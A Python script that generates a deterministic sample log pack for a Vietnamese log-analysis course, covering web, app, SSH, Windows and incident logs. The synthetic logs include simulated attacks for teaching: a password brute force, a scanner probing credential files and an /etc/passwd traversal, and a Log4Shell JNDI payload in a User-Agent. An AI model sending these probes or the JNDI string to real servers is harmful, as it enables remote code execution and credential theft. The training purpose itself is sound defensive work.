#!/usr/bin/env python3
# tao-goi-log.py — sinh "gói log mẫu" của khoá Đọc & làm chủ log từ A–Z (cuongthai.com).
# Chạy:  python3 tao-goi-log.py            → tạo thư mục ./log-lab
#        python3 tao-goi-log.py ~/log-lab  → tạo ở chỗ khác
# Chỉ dùng thư viện chuẩn, KHÔNG ngẫu nhiên thật: cùng một script ⇒ cùng từng byte trên mọi máy,
# nên đáp số trong bài khớp với máy bạn. Mọi IP thuộc dải dành cho tài liệu (RFC 5737:
# 192.0.2.x, 198.51.100.x, 203.0.113.x) hoặc dải nội bộ 10.x — không phải người thật.
import gzip, json, os, sys
from datetime import datetime, timedelta, timezone

GOC = os.path.abspath(os.path.expanduser(sys.argv[1] if len(sys.argv) > 1 else "log-lab"))
VN = timezone(timedelta(hours=7))
UTC = timezone.utc

class Lcg:  # bộ sinh số giả ngẫu nhiên tự viết — giống nhau trên mọi phiên bản Python
    def __init__(self, seed): self.s = seed & 0xFFFFFFFF
    def next(self):
        self.s = (1103515245 * self.s + 12345) & 0x7FFFFFFF
        return self.s
    def num(self, n): return (self.next() >> 16) % n   # bit cao: bit thấp của LCG lặp chu kỳ ngắn
    def pick(self, xs): return xs[self.num(len(xs))]

def ghi(rel, lines):
    p = os.path.join(GOC, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(lines) + "\n")

THANG = "Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split()
def clf(t):  # 20/Nov/2026:14:05:31 +0700 — kiểu thời gian của access log nginx/Apache
    return "%02d/%s/%d:%02d:%02d:%02d +0700" % (t.day, THANG[t.month - 1], t.year, t.hour, t.minute, t.second)

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 19_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0",
    "Mozilla/5.0 (Linux; Android 16; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
]
NGUOI = ["192.0.2.%d" % i for i in range(10, 50)] + ["198.51.100.%d" % i for i in range(100, 120)]
TRANG = [("GET", "/", 200, 5120), ("GET", "/courses", 200, 18400), ("GET", "/courses/log-tu-a-den-z", 200, 22300),
         ("GET", "/api/v1/feed", 200, 9800), ("GET", "/api/v1/notifications", 200, 640), ("GET", "/static/app.js", 200, 182000),
         ("GET", "/favicon.ico", 200, 1150), ("POST", "/api/v1/auth/login", 200, 410), ("GET", "/api/v1/me", 200, 380),
         ("GET", "/static/app.css", 304, 0), ("GET", "/courses/linux-bash", 200, 21000), ("GET", "/api/v1/feed?page=2", 200, 9100)]
# lưu lượng theo giờ (giờ VN): đêm vắng, tối đông nhất
NHIP = [3, 2, 1, 1, 1, 1, 2, 4, 7, 9, 10, 10, 9, 9, 10, 10, 9, 9, 11, 14, 16, 14, 9, 5]

def access_ngay(ngay, r, he_so, su_co):
    rows = []
    for h in range(24):
        for _ in range(NHIP[h] * he_so):
            t = ngay + timedelta(hours=h, seconds=r.num(3600))
            ip = r.pick(NGUOI); m, u, st, by = r.pick(TRANG)
            if st == 200 and r.num(60) == 0: st, by = 404, 153
            ua = r.pick(UA); ref = "https://cuongthai.example/courses" if r.num(3) == 0 else "-"
            if su_co and datetime(2026, 11, 20, 14, 4, 15, tzinfo=VN) <= t < datetime(2026, 11, 20, 14, 8, 30, tzinfo=VN) and u.startswith("/api/"):
                st, by = (504, 167) if r.num(3) else (502, 157)
            rows.append((t, '%s - - [%s] "%s %s HTTP/1.1" %d %d "%s" "%s"' % (ip, clf(t), m, u, st, by, ref, ua)))
    return rows

def tao_access():
    r = Lcg(20261120)
    ngay = datetime(2026, 11, 20, tzinfo=VN)
    rows = access_ngay(ngay, r, 20, True)
    # 02:10–02:40 một IP thử mật khẩu liên tục, 02:41 lọt vào
    t = datetime(2026, 11, 20, 2, 10, 3, tzinfo=VN)
    for i in range(420):
        rows.append((t, '203.0.113.66 - - [%s] "POST /api/v1/auth/login HTTP/1.1" 401 52 "-" "python-requests/2.32.3"' % clf(t)))
        t += timedelta(seconds=4 + r.num(2))
    rows.append((datetime(2026, 11, 20, 2, 41, 7, tzinfo=VN), '203.0.113.66 - - [20/Nov/2026:02:41:07 +0700] "POST /api/v1/auth/login HTTP/1.1" 200 410 "-" "python-requests/2.32.3"'))
    rows.append((datetime(2026, 11, 20, 2, 41, 9, tzinfo=VN), '203.0.113.66 - - [20/Nov/2026:02:41:09 +0700] "GET /api/v1/me HTTP/1.1" 200 380 "-" "python-requests/2.32.3"'))
    # 14:04:15–14:08:30 CSDL sập: mọi lời gọi /api/ trả 502/504, người dùng bấm tải lại liên tục
    t = datetime(2026, 11, 20, 14, 4, 15, tzinfo=VN)
    while t < datetime(2026, 11, 20, 14, 8, 30, tzinfo=VN):
        u = r.pick(["/api/v1/feed", "/api/v1/feed", "/api/v1/me", "/api/v1/notifications"])
        st, by = (504, 167) if t < datetime(2026, 11, 20, 14, 6, 2, tzinfo=VN) else (502, 157)
        rows.append((t, '%s - - [%s] "GET %s HTTP/1.1" %d %d "https://cuongthai.example/courses" "%s"' % (r.pick(NGUOI), clf(t), u, st, by, r.pick(UA))))
        t += timedelta(seconds=1 + r.num(3))
    # 03:15 máy quét lỗ hổng dò tệp nhạy cảm
    t = datetime(2026, 11, 20, 3, 15, 0, tzinfo=VN)
    for u in ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin/config.php", "/backup.zip", "/.aws/credentials",
              "/server-status", "/api/v1/../../etc/passwd", "/xmlrpc.php"] * 3:
        rows.append((t, '198.51.100.23 - - [%s] "GET %s HTTP/1.1" 404 153 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)"' % (clf(t), u)))
        t += timedelta(seconds=1)
    # 04:20 một lần dò Log4Shell trong User-Agent (học ở Chương 10)
    rows.append((datetime(2026, 11, 20, 4, 20, 11, tzinfo=VN), '198.51.100.99 - - [20/Nov/2026:04:20:11 +0700] "GET / HTTP/1.1" 200 5120 "-" "${jndi:ldap://198.51.100.99:1389/a}"'))
    rows.sort(key=lambda x: x[0])
    ghi("web/access.log", [x[1] for x in rows])
    hom_qua = access_ngay(datetime(2026, 11, 19, tzinfo=VN), Lcg(20261119), 6, False)
    hom_qua.sort(key=lambda x: x[0])
    os.makedirs(os.path.join(GOC, "web"), exist_ok=True)
    with gzip.GzipFile(os.path.join(GOC, "web/access.log.1.gz"), "wb", mtime=0) as g:
        g.write(("\n".join(x[1] for x in hom_qua) + "\n").encode())

def tao_app():
    r = Lcg(42)
    rows = []
    base = datetime(2026, 11, 20, 13, 0, tzinfo=VN)
    for i in range(720):
        t = base + timedelta(seconds=i * 10 + r.num(10), milliseconds=r.num(1000))
        ms = int(t.timestamp() * 1000)
        rid = "req-%05d" % (i + 1)
        u = r.pick(["/api/v1/feed", "/api/v1/me", "/api/v1/notifications", "/api/v1/courses", "/api/v1/auth/login"])
        down = datetime(2026, 11, 20, 14, 4, 13, tzinfo=VN) <= t < datetime(2026, 11, 20, 14, 8, 25, tzinfo=VN)
        if down:
            rows.append({"level": 50, "time": ms, "pid": 2318, "hostname": "web-01", "reqId": rid,
                         "req": {"method": "GET", "url": u}, "err": {"type": "Error", "code": "ECONNREFUSED",
                         "message": "connect ECONNREFUSED 10.0.0.20:5432"}, "msg": "database query failed"})
            continue
        st = 200; rt = 20 + r.num(120)
        if r.num(25) == 0: st = 404
        o = {"level": 30, "time": ms, "pid": 2318 if t < datetime(2026, 11, 20, 14, 8, 25, tzinfo=VN) else 2741,
             "hostname": "web-01", "reqId": rid, "req": {"method": "POST" if u.endswith("login") else "GET", "url": u},
             "res": {"statusCode": st}, "responseTime": rt, "msg": "request completed"}
        if r.num(4) == 0: o["userId"] = 1000 + r.num(40)
        rows.append(o)
        if r.num(30) == 0:
            rows.append({"level": 40, "time": ms + 5, "pid": o["pid"], "hostname": "web-01", "reqId": rid,
                         "durationMs": 800 + r.num(2500), "msg": "slow query", "query": "SELECT * FROM posts ORDER BY created_at DESC LIMIT 20"})
    rows.sort(key=lambda o: o["time"])
    ghi("app/app.jsonl", [json.dumps(o, ensure_ascii=False, separators=(",", ":")) for o in rows])
    hong = [json.dumps(o, separators=(",", ":")) for o in rows[:3]]
    hong.insert(2, "npm WARN config production Use `--omit=dev` instead.")
    ghi("app/app-hong.jsonl", hong)

def tao_auth():
    r = Lcg(7)
    rows = []
    t = datetime(2026, 11, 20, 1, 58, 2, tzinfo=VN)
    users = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "deploy", "git"]
    pid = 41000
    for i in range(160):
        u = r.pick(users); pid += 1 + r.num(5)
        ip = r.pick(["203.0.113.66", "203.0.113.66", "203.0.113.70", "198.51.100.23"])
        if u == "root" or u == "deploy":
            msg = "Failed password for %s from %s port %d ssh2" % (u, ip, 40000 + r.num(20000))
        else:
            msg = "Failed password for invalid user %s from %s port %d ssh2" % (u, ip, 40000 + r.num(20000))
        rows.append("%s %2d %02d:%02d:%02d web-01 sshd[%d]: %s" % (THANG[t.month - 1], t.day, t.hour, t.minute, t.second, pid, msg))
        t += timedelta(seconds=2 + r.num(9))
    rows.append("Nov 20 09:02:11 web-01 sshd[52001]: Accepted publickey for deploy from 192.0.2.10 port 51122 ssh2: ED25519 SHA256:Gm0fakefakefakefakefakefakefakefakefake")
    rows.append("Nov 20 09:02:11 web-01 sshd[52001]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by deploy(uid=0)")
    rows.append("Nov 20 09:05:40 web-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart ctw-api")
    ghi("linux/auth.log", rows)

def tao_incident():
    # Một sự cố, năm nguồn, ba máy: db-win01 (Windows + PostgreSQL), api-01 (app Node + journal), proxy-01 (nginx).
    # Thời điểm THẬT (UTC) của từng dòng: xem đáp án Lab 1 (bài 1.7).
    ghi("incident/windows-system.csv", [
        '"TimeCreated","Id","ProviderName","Message"',
        '"11/20/2026 2:07:30 PM","12","Microsoft-Windows-Kernel-General","The operating system started at system time 2026-11-20T07:07:28.500000000Z."',
        '"11/20/2026 2:07:41 PM","41","Microsoft-Windows-Kernel-Power","The system has rebooted without cleanly shutting down first. This error could be caused if the system stopped responding, crashed, or lost power unexpectedly."',
        '"11/20/2026 2:07:55 PM","6008","EventLog","The previous system shutdown at 2:04:12 PM on 11/20/2026 was unexpected."',
        '"11/20/2026 2:07:55 PM","6005","EventLog","The Event log service was started."',
    ])
    ghi("incident/postgresql.log", [
        "2026-11-20 07:03:58.114 UTC [1880] LOG:  checkpoint starting: time",
        "2026-11-20 07:08:20.402 UTC [612] LOG:  database system was interrupted; last known up at 2026-11-20 07:03:58 UTC",
        "2026-11-20 07:08:20.517 UTC [612] LOG:  database system was not properly shut down; automatic recovery in progress",
        "2026-11-20 07:08:22.990 UTC [612] LOG:  redo done at 0/3A1B2C8",
        "2026-11-20 07:08:23.201 UTC [604] LOG:  database system is ready to accept connections",
    ])
    def j(o): return json.dumps(o, separators=(",", ":"))
    def ms(h, m, s, f): return int(datetime(2026, 11, 20, h, m, s, f * 1000, tzinfo=UTC).timestamp() * 1000)
    ghi("incident/app.jsonl", [
        j({"level": 50, "time": ms(7, 4, 13, 88), "pid": 2318, "hostname": "api-01", "msg": "database query failed", "err": {"code": "ECONNREFUSED", "message": "connect ECONNREFUSED 10.0.0.20:5432"}}),
        j({"level": 50, "time": ms(7, 5, 59, 870), "pid": 2318, "hostname": "api-01", "msg": "pool exhausted, giving up", "err": {"code": "ECONNREFUSED"}}),
        j({"level": 60, "time": ms(7, 6, 1, 912), "pid": 2318, "hostname": "api-01", "msg": "unhandled rejection, exiting"}),
        j({"level": 30, "time": ms(7, 8, 30, 15), "pid": 2741, "hostname": "api-01", "msg": "connected to database"}),
    ])
    # nginx chạy trên proxy-01 — ĐỒNG HỒ MÁY NÀY NHANH 180 GIÂY (chrony hỏng) và error log ghi giờ địa phương không độ lệch (bài 1.5, Lab 1)
    ghi("incident/nginx-error.log", [
        "2026/11/20 14:08:15 [error] 811#811: *48213 upstream timed out (110: Connection timed out) while reading response header from upstream, client: 192.0.2.31, server: cuongthai.example, request: \"GET /api/v1/feed HTTP/1.1\", upstream: \"http://10.0.0.30:4000/api/v1/feed\", host: \"cuongthai.example\"",
        "2026/11/20 14:09:02 [error] 811#811: *48377 connect() failed (111: Connection refused) while connecting to upstream, client: 192.0.2.44, server: cuongthai.example, request: \"GET /api/v1/me HTTP/1.1\", upstream: \"http://10.0.0.30:4000/api/v1/me\", host: \"cuongthai.example\"",
        "2026/11/20 14:09:05 [error] 811#811: *48380 no live upstreams while connecting to upstream, client: 192.0.2.12, server: cuongthai.example, request: \"GET / HTTP/1.1\", upstream: \"http://api/\", host: \"cuongthai.example\"",
    ])
    # journal của api-01 (máy chạy app Node) — đồng hồ đúng
    ghi("incident/journal-api01.txt", [
        "2026-11-20T14:06:02+07:00 api-01 systemd[1]: ctw-api.service: Main process exited, code=exited, status=1/FAILURE",
        "2026-11-20T14:06:02+07:00 api-01 systemd[1]: ctw-api.service: Failed with result 'exit-code'.",
        "2026-11-20T14:06:07+07:00 api-01 systemd[1]: ctw-api.service: Scheduled restart job, restart counter is at 1.",
        "2026-11-20T14:06:07+07:00 api-01 systemd[1]: Started ctw-api.service - CT Work API.",
    ])

def tao_windows_text():
    r = Lcg(99)
    rows = ["#Software: Microsoft Internet Information Services 10.0", "#Version: 1.0", "#Date: 2026-11-20 00:00:01",
            "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken"]
    t = datetime(2026, 11, 20, 0, 0, 1, tzinfo=UTC)
    pages = ["/", "/portal/login.aspx", "/portal/home.aspx", "/api/orders", "/images/logo.png", "/portal/report.aspx"]
    for i in range(300):
        t += timedelta(seconds=40 + r.num(200))
        p = r.pick(pages); st, sub = 200, 0
        if p == "/portal/report.aspx" and r.num(3) == 0: st, sub = 500, 0
        if r.num(40) == 0: p, st = "/old-page.aspx", 404
        ip = r.pick(NGUOI[:15])
        tt = 15 + r.num(300) if st != 500 else 3000 + r.num(9000)
        rows.append("%s %s 10.0.0.5 %s %s - 443 - %s %s - %d %d 0 %d" % (t.strftime("%Y-%m-%d"), t.strftime("%H:%M:%S"),
                    "POST" if "login" in p else "GET", p, ip, "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)", st, sub, tt))
    ghi("windows/u_ex261120.log", rows)
    fw = ["#Version: 1.5", "#Software: Microsoft Windows Firewall", "#Time Format: Local",
          "#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path pid", ""]
    t = datetime(2026, 11, 20, 8, 0, 0)
    for i in range(200):
        t += timedelta(seconds=5 + r.num(60))
        if 60 <= i < 110:
            fw.append("%s DROP TCP 203.0.113.70 10.0.0.5 %d 3389 52 S 0 0 64240 - - - RECEIVE 4" % (t.strftime("%Y-%m-%d %H:%M:%S"), 50000 + r.num(9000)))
        else:
            fw.append("%s ALLOW TCP 10.0.0.5 %s %d 443 0 - - - - - - - SEND %d" % (t.strftime("%Y-%m-%d %H:%M:%S"),
                      r.pick(["192.0.2.80", "198.51.100.7", "192.0.2.81"]), 49000 + r.num(16000), r.pick([4120, 4120, 7788, 912])))
    ghi("windows/pfirewall.log", fw)

def tao_formats():
    # MỘT sự kiện "đăng nhập SSH sai mật khẩu" viết theo sáu định dạng (bài 1.4); bản Windows là sự kiện tương đương 4625 (rút gọn EventData)
    ghi("formats/rfc3164.log", ["<38>Nov 20 02:10:03 web-01 sshd[41001]: Failed password for an from 203.0.113.66 port 51515 ssh2"])
    ghi("formats/rfc5424.log", ['<38>1 2026-11-20T02:10:03.512+07:00 web-01 sshd 41001 - [origin ip="10.0.0.10"] Failed password for an from 203.0.113.66 port 51515 ssh2'])
    ghi("formats/json.log", ['{"time":"2026-11-20T02:10:03.512+07:00","host":"web-01","app":"sshd","pid":41001,"level":"info","event":"login_failed","user":"an","src_ip":"203.0.113.66","src_port":51515,"msg":"Failed password"}'])
    ghi("formats/logfmt.log", ['time=2026-11-20T02:10:03.512+07:00 host=web-01 app=sshd pid=41001 level=info event=login_failed user=an src_ip=203.0.113.66 src_port=51515 msg="Failed password"'])
    ghi("formats/cef.log", ["CEF:0|OpenBSD|OpenSSH|9.6|login_failed|Failed password|5|rt=Nov 20 2026 02:10:03 +0700 src=203.0.113.66 spt=51515 suser=an dhost=web-01"])
    ghi("formats/event-4625.xml", [
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">',
        '  <System>',
        '    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />',
        '    <EventID>4625</EventID>',
        '    <Level>0</Level>',
        '    <Task>12544</Task>',
        '    <Keywords>0x8010000000000000</Keywords>',
        '    <TimeCreated SystemTime="2026-11-19T19:10:03.5120000Z" />',
        '    <EventRecordID>88412</EventRecordID>',
        '    <Channel>Security</Channel>',
        '    <Computer>DESKTOP-LAB01</Computer>',
        '  </System>',
        '  <EventData>',
        '    <Data Name="TargetUserName">an</Data>',
        '    <Data Name="LogonType">3</Data>',
        '    <Data Name="IpAddress">203.0.113.66</Data>',
        '    <Data Name="IpPort">51515</Data>',
        '    <Data Name="Status">0xc000006d</Data>',
        '    <Data Name="SubStatus">0xc000006a</Data>',
        '  </EventData>',
        '</Event>',
    ])

tao_access(); tao_app(); tao_auth(); tao_incident(); tao_windows_text(); tao_formats()
print("Đã tạo gói log mẫu ở", GOC)
for d, _, fs in sorted(os.walk(GOC)):
    for f in sorted(fs):
        p = os.path.join(d, f)
        print("  %-32s %8d byte" % (os.path.relpath(p, GOC), os.path.getsize(p)))
